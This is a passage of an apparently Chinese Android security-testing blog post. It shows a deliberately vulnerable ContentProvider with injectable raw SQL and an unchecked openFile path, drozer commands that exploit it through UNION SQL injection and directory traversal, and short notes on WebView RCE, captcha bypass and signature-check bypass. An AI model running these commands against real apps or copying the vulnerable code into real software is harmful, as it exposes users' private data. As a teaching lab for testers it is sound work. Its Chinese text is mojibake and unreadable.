&#125;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fileOutputStream.write(<span class="string">&quot;Vulnerable content for traversal test&quot;</span>.getBytes());</span><br><span class="line">                fileOutputStream.close();</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;æµ‹è¯•æ–‡ä»¶å·²åˆ›å»ºï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;åˆ›å»ºæµ‹è¯•æ–‡ä»¶å¤±è´¥&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri uri, String str)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPath</span> <span class="operator">=</span> uri.getEncodedPath();</span><br><span class="line">        <span class="keyword">if</span> (encodedPath.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            encodedPath = encodedPath.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getFilesDir().getParentFile(), encodedPath);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;å°è¯•è®¿é—®æ–‡ä»¶ï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file, <span class="number">268435456</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] strArr, String str, String[] strArr2, String str2)</span> &#123;</span><br><span class="line">        <span class="type">SQLiteDatabase</span> <span class="variable">readableDatabase</span> <span class="operator">=</span> <span class="built_in">this</span>.dbHelper.getReadableDatabase();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;SELECT * FROM users WHERE &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            str = <span class="string">&quot;1=1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> readableDatabase.rawQuery(sb.append(str).toString(), <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL Inject: determine the number of columns</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 order by 10&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924101320234.png" alt="image-20250924101320234"></p>
</li>
<li><p>SQL Inject: Determine some information about the database</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sqlite_version()&quot;</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 0, 00, sql from sqlite_master&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102628867.png" alt="image-20250924102628867"></p>
</li>
<li><p>SQL Inject: Query data of other tables</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.query content://com.asec.alan.provider --selection &quot;1=1 union select 11, 22, locale from android_metadata&quot;</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924102809532.png" alt="image-20250924102809532"></p>
</li>
</ol>
<h4 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Content Provider çš„openFile()æ–¹æ³•æœªéªŒè¯æ–‡ä»¶è·¯å¾„ï¼Œå¯¼è‡´æ”»å‡»è€…å¯è®¿é—®åº”ç”¨æ²™ç›’å¤–çš„ä»»æ„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<ol>
<li><p>Scanner traversal vulnerbilities of provider</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.asec.alan</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103551392.png" alt="image-20250924103551392"></p>
</li>
<li><p>Read other filesâ€™ contents by traversal vulnerability</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run app.provider.read content://com.asec.alan.provider/../../../../../../../../../../../../../../../system/etc/hosts</span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20250924103733116.png" alt="image-20250924103733116"></p>
</li>
</ol>
<h2 id="Unsafe-Configuration"><a href="#Unsafe-Configuration" class="headerlink" title="Unsafe Configuration"></a>Unsafe Configuration</h2><h3 id="Allow-Backup"><a href="#Allow-Backup" class="headerlink" title="Allow Backup"></a>Allow Backup</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">é€šè®¯å½•åº”ç”¨ï¼Œä¸€æ—¦åº”ç”¨ç¨‹åºæ”¯æŒå¤‡ä»½å’Œæ¢å¤åŠŸèƒ½ï¼Œæ”»å‡»è€…å³å¯é€šè¿‡ adb backup å’Œ adb restore è¿›è¡Œæ¢å¤æ–°å®‰è£…çš„åŒä¸€ä¸ªåº”ç”¨æ¥æŸ¥çœ‹èŠå¤©è®°å½•ç­‰ä¿¡æ¯</span><br><span class="line">æ”¯ä»˜é‡‘èç±»åº”ç”¨ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ­¤æ¥è¿›è¡Œæ¶æ„æ”¯ä»˜ã€ç›—å–å­˜æ¬¾ç­‰</span><br></pre></td></tr></table></figure>

<h3 id="Debuggable"><a href="#Debuggable" class="headerlink" title="Debuggable"></a>Debuggable</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">android:debuggableå±æ€§æ˜¯æŒ‡å®šåº”ç”¨ç¨‹åºæ˜¯å¦èƒ½å¤Ÿè¢«è°ƒè¯•ï¼Œå³æ—¶æ˜¯ä»¥ç”¨æˆ·æ¨¡å¼è¿è¡Œåœ¨è®¾å¤‡ä¸Šçš„æ—¶å€™ï¼Œå¦‚æœè®¾ç½®ä¸º true ï¼Œåˆ™èƒ½å¤Ÿè¢«è°ƒè¯•ï¼Œå¦åˆ™ä¸èƒ½è°ƒè¯•ï¼Œé»˜è®¤å€¼æ˜¯false</span><br><span class="line"></span><br><span class="line">é€†å‘å·¥ä½œäººå‘˜åœ¨å¯¹ä¸€ä¸ªapkç¨‹åºè¿›è¡Œé€†å‘æ—¶ï¼Œç¬¬ä¸€æ­¥å¾€å¾€å°±æ˜¯è¦å¯¹debuggableå±æ€§è¿›è¡Œç»•è¿‡ï¼Œå¦åˆ™å°±ä¸èƒ½è¿›è¡Œæ­£å¸¸çš„è°ƒè¯•ï¼Œå› æ­¤å¦‚æœå±æ€§æœ¬èº«è®¾ä¸ºtrueï¼Œæ›´å®¹æ˜“å¯¼è‡´è¯¥åº”ç”¨å­˜åœ¨åŠ¨æ€è°ƒè¯•ï¼Œæ³„éœ²æ•°æ®ä¿¡æ¯çš„é£é™©</span><br></pre></td></tr></table></figure>

<h3 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h3><h4 id="LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´"><a href="#LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´" class="headerlink" title="LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´"></a>LogCatè¾“å‡ºæ•æ„Ÿä¿¡æ¯æ¼æ´</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨APPçš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œå¼€å‘è€…é€šå¸¸ä¼šç”¨logcatè¾“å‡ºinfoã€debugã€error ç­‰ä¿¡æ¯ã€‚å¦‚æœåœ¨APPå‘å¸ƒæ—¶æ²¡æœ‰å»æ‰logcatä¿¡æ¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡æŸ¥çœ‹logcatæ—¥å¿—è·å¾—æ•æ„Ÿä¿¡æ¯.</span><br><span class="line"></span><br><span class="line">åº”ç”¨å±‚Logæ•æ„Ÿä¿¡æ¯è¾“å‡º</span><br><span class="line">åº”ç”¨å±‚System.out.printlnæ•æ„Ÿä¿¡æ¯è¾“å‡º</span><br><span class="line">ç³»ç»Ÿbugå¼‚å¸¸å¯¼è‡´Logè¾“å‡º</span><br><span class="line">Nativeå±‚æ•æ„ŸLogè¾“å‡º</span><br></pre></td></tr></table></figure>

<h4 id="ç¡¬ç¼–ç "><a href="#ç¡¬ç¼–ç " class="headerlink" title="ç¡¬ç¼–ç "></a>ç¡¬ç¼–ç </h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ä¸€äº›å¼€å‘äººå‘˜ï¼Œåœ¨å¼€å‘æ—¶ä½¿ç”¨ç¡¬ç¼–ç çš„æ–¹å¼ï¼Œå¯¼è‡´å­˜åœ¨ä¸€å®šçš„å®‰å…¨é£é™©ï¼Œç¡¬ç¼–ç ä¸€èˆ¬æ˜¯æŒ‡å°†è¾“å‡ºæˆ–è¾“å…¥çš„ç›¸å…³å‚æ•°ä»¥å¸¸é‡çš„æ–¹å¼ç¼–å†™åœ¨æºä»£ç ä¸­ï¼Œè¿™æ ·å¯¼è‡´é€†å‘åˆ†æäººå‘˜å¯ä»¥ç›´æ¥é€šè¿‡åˆ†ææºç å°±å¯ä»¥è·å¾—æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h4 id="Shared-Preferenceå…¨å±€å¯è¯»å†™æ¼æ´"><a href="#Shared-Preferenceå…¨å±€å¯è¯»å†™æ¼æ´" class="headerlink" title="Shared Preferenceå…¨å±€å¯è¯»å†™æ¼æ´"></a>Shared Preferenceå…¨å±€å¯è¯»å†™æ¼æ´</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Shared Preferenceså­˜å‚¨å®‰å…¨é£é™©åœ¨äºï¼šå¼€å‘è€…åœ¨åˆ›å»ºæ–‡ä»¶æ—¶æ²¡æœ‰æ­£ç¡®çš„é€‰æ‹©åˆé€‚çš„åˆ›å»ºæ¨¡å¼ï¼ˆMODE_PRIVATEã€MODE_WOELD_READABLEä»¥åŠMODE_WORLD_WRITEABBLEï¼‰è¿›è¡Œæƒé™æ§åˆ¶ï¼Œå¯¼è‡´å°†ä¸€äº›ç”¨æˆ·ä¿¡æ¯ã€å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯å­˜å‚¨åœ¨Shared Preferencesæ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡rootæ¥æŸ¥çœ‹æ•æ„Ÿä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h4 id="SDå¡è¯»å†™"><a href="#SDå¡è¯»å†™" class="headerlink" title="SDå¡è¯»å†™"></a>SDå¡è¯»å†™</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç°åœ¨çš„æ‰‹æœºå¾ˆå¤šçš„å…¬å…±ç›®å½•éƒ½æ˜¯è‡ªèº«è‡ªå¸¦çš„å­˜å‚¨ç©ºé—´ï¼ŒAndroidç³»ç»Ÿçš„æ–‡ä»¶ä¸€èˆ¬éƒ½å­˜å‚¨åœ¨sdCardå’Œåº”ç”¨çš„ç§æœ‰ç›®å½•ä¸‹ï¼Œä»»ä½•åœ¨Android Manifestä¸­å£°æ˜è¯»å†™sdcardæƒé™çš„åº”ç”¨éƒ½å¯ä»¥å¯¹sdcardè¿›è¡Œè¯»å†™ã€‚</span><br></pre></td></tr></table></figure>

<h2 id="Unsafe-HTTP-s"><a href="#Unsafe-HTTP-s" class="headerlink" title="Unsafe HTTP&#x2F;s"></a>Unsafe HTTP&#x2F;s</h2><h3 id="Plaintext-Transmit"><a href="#Plaintext-Transmit" class="headerlink" title="Plaintext Transmit"></a>Plaintext Transmit</h3><h3 id="Lack-verification-of-certificate"><a href="#Lack-verification-of-certificate" class="headerlink" title="Lack verification of certificate"></a>Lack verification of certificate</h3><h3 id="Lack-verification-of-hostname"><a href="#Lack-verification-of-hostname" class="headerlink" title="Lack verification of hostname"></a>Lack verification of hostname</h3><h3 id="Bypass-certificate"><a href="#Bypass-certificate" class="headerlink" title="Bypass certificate"></a>Bypass certificate</h3><h2 id="Captcha"><a href="#Captcha" class="headerlink" title="Captcha"></a>Captcha</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç æš´åŠ›ç ´è§£æ¼æ´ä¸€èˆ¬æ˜¯å› ä¸ºç”¨æˆ·ä½¿ç”¨æ‰‹æœºå·+éªŒè¯ç çš„æ–¹å¼è¿›è¡Œç™»é™†æ—¶ï¼ŒçŸ­ä¿¡éªŒè¯ç ä¸€èˆ¬ç”±4-6ä½æ•°å­—ç»„æˆï¼Œè€Œä¸”APPå¹¶æœªå¯¹éªŒè¯ç åšæ—¶é—´å’Œå¤±è´¥æ¬¡æ•°æ ¡éªŒï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªåŒºé—´çš„æ‰€æœ‰æ•°å­—è¿›è¡Œæš´åŠ›ç ´è§£æ¥è¿›è¡Œæ”»å‡»</span><br></pre></td></tr></table></figure>

<h3 id="Interface-Abuse"><a href="#Interface-Abuse" class="headerlink" title="Interface Abuse"></a>Interface Abuse</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">éªŒè¯ç æ— é™æ¬¡æ•°å‘é€ã€çŸ­ä¿¡è½°ç‚¸æ¼æ´ä¸€èˆ¬æ˜¯APPç«¯å¹¶æ²¡æœ‰å¯¹æ‰‹æœºå·ç è¿›è¡Œæ¬¡æ•°æ˜¾ç¤ºï¼Œä¹Ÿæœªå¯¹è®¿é—®è¿›è¡Œæ—¶é—´é™åˆ¶</span><br></pre></td></tr></table></figure>

<h3 id="Amnipotent-Captcha"><a href="#Amnipotent-Captcha" class="headerlink" title="Amnipotent Captcha"></a>Amnipotent Captcha</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. éªŒè¯ç æ‰§è¡Œã€æ‰¾å›å¯†ç ã€‘æ“ä½œæ—¶ï¼Œè¾“å…¥æ‰‹æœºå·ï¼Œè·å–éªŒè¯ç ï¼ŒæœåŠ¡å™¨ä¼šå‘æ‰‹æœºå‘é€éªŒè¯ç ï¼Œé€šè¿‡burpsuiteæŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹è¿”å›çš„å“åº”æ•°æ®åŒ…ä¸­å¦‚æœåŒ…å«éªŒè¯ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´ç”¨æˆ·å¯†ç æ¶æ„é‡ç½®ã€ç»‘å®šæ‰‹æœºå·è¢«æ¶æ„æ›´æ¢ç­‰é£é™©</span><br><span class="line">2. ä¸‡èƒ½éªŒè¯ç ä¸€èˆ¬æ˜¯å¼€å‘åœ¨ä¸šåŠ¡æœªä¸Šçº¿çš„æ—¶å€™ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ç”¨çš„,ä¸Šçº¿åå¿˜è®°åˆ é™¤äº†,ä¾‹å¦‚[8888 0000 1234](tel:8888 0000 1234)ç­‰ç­‰</span><br></pre></td></tr></table></figure>

<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">åœ¨APPéªŒè¯ç æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°å¾ˆå¯¹APPå¹¶æœªå¯¹ç™»å½•æˆåŠŸçš„å“åº”æŠ¥æ–‡è¿›è¡Œæ ¡éªŒï¼Œå¯¼è‡´æˆ‘ä»¬è·å–ç™»å½•æˆåŠŸçš„å“åº”æŠ¥æ–‡åï¼Œå°±å¯ä»¥é€šè¿‡æ­£ç¡®çš„å“åº”æŠ¥æ–‡å®ç°ä»»æ„å·ç çš„ç™»å½•ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²</span><br></pre></td></tr></table></figure>

<h2 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å½“JSæ‹¿åˆ°Androidè¿™ä¸ªå¯¹è±¡åï¼Œå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªAndroidå¯¹è±¡ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç±»ï¼ˆjava.lang.Runtime ç±»ï¼‰ï¼Œä»è€Œè¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</span><br><span class="line">ï¼ˆ1ï¼‰Androidä¸­çš„å¯¹è±¡æœ‰ä¸€å…¬å…±çš„æ–¹æ³•ï¼šgetClass() </span><br><span class="line">ï¼ˆ2ï¼‰è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç±» ç±»å‹Class</span><br><span class="line">ï¼ˆ3ï¼‰è¯¥ç±»æœ‰ä¸€å…³é”®çš„æ–¹æ³•ï¼š Class.forNameï¼›</span><br><span class="line">ï¼ˆ4ï¼‰è¯¥æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼ˆå¯åŠ è½½ java.lang.Runtime ç±»ï¼‰</span><br><span class="line">ï¼ˆ5ï¼‰è€Œè¯¥ç±»æ˜¯å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„</span><br></pre></td></tr></table></figure>

<h3 id="Plaintext-Strorage"><a href="#Plaintext-Strorage" class="headerlink" title="Plaintext Strorage"></a>Plaintext Strorage</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·è¾“å…¥å¯†ç æ—¶ï¼Œä¼šå¼¹å‡ºæç¤ºæ¡†ï¼šè¯¢é—®ç”¨æˆ·æ˜¯å¦ä¿å­˜å¯†ç ï¼›å¦‚æœé€‰æ‹©â€æ˜¯â€ï¼Œå¯†ç ä¼šè¢«æ˜æ–‡ä¿åˆ° /data/data/com.package.name/databases/webview.db ä¸­</span><br></pre></td></tr></table></figure>

<h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</span><br><span class="line">è¿™æ ·ä½¿å¾—WebViewå¯ä»¥ä½¿ç”¨Fileåè®®ï¼Œå’ŒåŠ è½½Jsä»£ç è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæˆ–è®¿é—®httpæºï¼Œè¿™æ ·ä¼šå¯¼è‡´æ”»å‡»è€…æ“ä½œç”¨æˆ·ç‚¹å‡»åæ— æ„ŸçŸ¥ä¸‹è½½æ¶æ„çš„HTML/JSï¼Œå¹¶çªƒå–ç›¸å…³çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h3 id="ä»»æ„ç•Œé¢æ³¨å…¥"><a href="#ä»»æ„ç•Œé¢æ³¨å…¥" class="headerlink" title="ä»»æ„ç•Œé¢æ³¨å…¥"></a>ä»»æ„ç•Œé¢æ³¨å…¥</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</span><br><span class="line">ç”¨åŒæ ·çš„æ–¹å¼æµ‹è¯• setAllowUniversalAccessFromFileURLs çš„å€¼ï¼Œå½“ setAllowUniversalAccessFromFileURLs çš„å€¼ä¸º true æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ js æ¥è®¿é—®æ¶æ„ç½‘ç«™ï¼ˆHTTP æˆ– HTTPSï¼‰çš„é“¾æ¥</span><br></pre></td></tr></table></figure>

<h3 id="Cookieç›—ç”¨"><a href="#Cookieç›—ç”¨" class="headerlink" title="Cookieç›—ç”¨"></a>Cookieç›—ç”¨</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æ”»å‡»è€…åˆ›é€ ç¬¦å·é“¾æ¥ï¼Œç„¶åç»•è¿‡æ ¡éªŒï¼Œè®¿é—®æ”»å‡»çš„htmlï¼Œå†é€šè¿‡è½¯é“¾æ¥å»åŠ è½½symlink.htmlï¼Œç„¶åçªƒå–Cooike</span><br></pre></td></tr></table></figure>

<h3 id="Launch-Any-Where"><a href="#Launch-Any-Where" class="headerlink" title="Launch Any Where"></a>Launch Any Where</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Intentå¯ä»¥é€šè¿‡é‡å®šå‘çš„åŸç†ï¼Œé€šè¿‡æºå¸¦æ•°æ®ä¿¡æ¯ï¼Œè®¿é—®ä¸€ä¸ªå¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œç„¶åå†è¿›è¡Œæ•°æ®ä¼ é€’å»è§¦å‘ä¸å¯å¯¼å‡ºçš„ç»„ä»¶ï¼Œæœ€åå®ç°è®¿é—®ç§æœ‰ç»„ä»¶çš„ç›®çš„ï¼Œå¼•èµ·launchAnyWhereæ¼æ´</span><br></pre></td></tr></table></figure>

<h3 id="DeepLink-RCE"><a href="#DeepLink-RCE" class="headerlink" title="DeepLink_RCE"></a>DeepLink_RCE</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">æ ·æœ¬ä»£ç å±‚é€šè¿‡åå°„è°ƒç”¨å»å®‰è£…çš„åˆ—è¡¨ä¸­æœç´¢å®‰è£…çš„åº”ç”¨ï¼Œç„¶åå»è°ƒç”¨å…¶æ–¹æ³•è¿›è¡Œå®ç°ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç›¸åŒçš„åŒ…åï¼Œç„¶åå°†æ”»å‡»æ ·æœ¬å»å®‰è£…åˆ°æ‰‹æœºä¸Šï¼Œæ˜¯çš„åº”ç”¨è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</span><br></pre></td></tr></table></figure>

<h3 id="WebView-loadDataWithBaseURL"><a href="#WebView-loadDataWithBaseURL" class="headerlink" title="WebView loadDataWithBaseURL"></a>WebView loadDataWithBaseURL</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">å½“loadDataWithBaseURLçš„åŸŸåå’Œå†…å®¹åŒæ—¶å¯æ§æ˜¯ï¼Œå¯ä»¥æ„é€ ä»»æ„åŸŸä¸‹çš„XSS;é€šè¿‡æ¶æ„çš„deeplinkæ‰“å¼€ä»»æ„fragmentçš„æ¼æ´ï¼Œå®ç°å¯æ§ä»»æ„åŸŸæ‰§è¡Œä»»æ„JSï¼Œå®ç°ç›—å–ç™»é™†æ€çš„ç”¨æˆ·cookieï¼</span><br></pre></td></tr></table></figure>

<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½"><a href="#ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½" class="headerlink" title="ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½"></a>ä¸å®‰å…¨çš„åŠ¨æ€åŠ è½½</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Androidç³»ç»Ÿæä¾›ç±»åŠ è½½å™¨DexClassLoaderï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½æ‰§è¡ŒåŒ…å«çš„JARæˆ–APKæ–‡ä»¶å†…çš„DEXæ–‡ä»¶ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ‰€åŠ è½½çš„Dexæ–‡ä»¶è¢«æ¶æ„åº”ç”¨æ›¿æ¢æˆ–ä»£ç æ³¨å…¥ï¼Œå¦‚æœä¸å¯¹Dexæ–‡ä»¶è¿›è¡Œç­¾åæ ¡éªŒï¼Œå°±å¯èƒ½å¯¼è‡´åŠ è½½çš„æ˜¯æ¶æ„ä»£ç ï¼Œè¿™æ ·å°±ä¼šè¿›ä¸€æ­¥é€ æˆä¸¥é‡å±å®³</span><br></pre></td></tr></table></figure>

<h3 id="ç­¾åç»•è¿‡"><a href="#ç­¾åç»•è¿‡" class="headerlink" title="ç­¾åç»•è¿‡"></a>ç­¾åç»•è¿‡</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">javaå±‚çš„ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šè¿™ç§æ˜¯å¼€å‘è€…åœ¨APK javaå±‚ä¸­åŠ å…¥äº†ç­¾åæ ¡éªŒä»£ç ï¼Œç„¶åé€šè¿‡æ ¡éªŒåŠ å…¥æ–‡ä»¶çš„MD5å€¼æˆ–è€…SHA1å€¼æ¥å¯¹æ–‡ä»¶è¿›è¡Œæ ¡éªŒ</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šä¸€èˆ¬è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬é€šè¿‡å®šä½åˆ°APKä¸­çš„ç­¾åä»£ç æ®µï¼Œç„¶åè¿›è¡Œhook ç¯¡æ”¹æˆ–è€…è¿›è¡Œä¿®æ”¹åé‡æ‰“åŒ…å°±å¯ä»¥è¿›è¡Œç»•è¿‡</span><br><span class="line">soå±‚çš„ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šç”±äºjavaå¯è§£é‡Šè¯­è¨€çš„åŸå› ï¼Œæ‰€ä»¥åæ¥å¼€å‘è€…åˆå°†ç­¾åä»£ç æ”¾å…¥soå±‚ï¼Œä»è€Œå¢åŠ é€†å‘å·¥ä½œçš„éš¾åº¦</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šè¿™ç§æƒ…å†µï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨IDAæˆ–GDBè¿›è¡ŒåŠ¨æ€è°ƒè¯•ç¡®å®šåˆ°ç­¾åä»£ç æ®µï¼Œç„¶åä½¿ç”¨hook æ³¨å…¥æŠ€æœ¯æˆ–é™æ€ä¿®æ”¹æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">åœ¨çº¿ç­¾åæ ¡éªŒï¼š</span><br><span class="line">åŸç†ï¼šç”±äºå‰ä¸¤ç§æ–¹å¼éƒ½æ˜¯é™æ€æ ¡éªŒçš„æ–¹å¼ï¼Œè¿™æ ·çš„å®‰å…¨æ€§ä»ç„¶è¾ƒä½ï¼Œåæ¥æ›´å¤šå‚å•†é€šè¿‡æœåŠ¡å™¨åœ¨çº¿è¿›è¡ŒéªŒè¯ï¼Œå°†ç­¾åå¯†é’¥å‘é€ç„¶ååœ¨soå±‚æˆ–javaå±‚ä¸­è¿›è¡Œæ ¡éªŒ</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼šè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬è¦ä½¿ç”¨æŠ“åŒ…è½¯ä»¶å¯¹æœåŠ¡å™¨å‘é€çš„æ•°æ®åŒ…è¿›è¡ŒæŠ“å–ï¼Œåœ¨æˆåŠŸè·å–æ­£ç¡®å¯†é’¥åï¼Œå†å»hookå¯¹åº”çš„ç­¾åä»£ç æ®µï¼Œä»è€Œå°±å¯ä»¥å®ç°ç»•è¿‡</span><br></pre></td></tr></table></figure>

